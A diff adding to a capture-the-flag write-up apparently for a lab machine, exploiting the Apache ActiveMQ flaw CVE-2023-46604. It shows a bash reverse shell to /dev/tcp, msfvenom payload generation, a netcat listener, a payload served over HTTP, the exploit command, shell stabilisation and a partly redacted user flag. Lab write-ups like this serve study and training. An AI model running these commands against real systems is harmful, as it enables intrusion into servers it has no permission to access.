@@ -214,6 +214,42 @@ nc -lvnp 9001
 bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001'
 ```
 
+Could not get reverse shell to work above. Followed this [github](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ) instead:
+
+```bash
+git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell
+cd CVE-2023-46604-RCE-Reverse-Shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf
+python3 -m http.server 8001
+nc -lvnp 4444
+```
+
+Ran exploit script:
+
+```bash
+go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.6:8001/poc-linux.xml
+```
+
+Stabilised reverse shell:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Retrieved user flag:
+
+```bash
+activemq@broker:/home/activemq$ cat user.txt
+cat user.txt
+ccfaec2a1a9343d88.......
+```
+
+# Root flag:
+
+
+
+
+
 
 
 
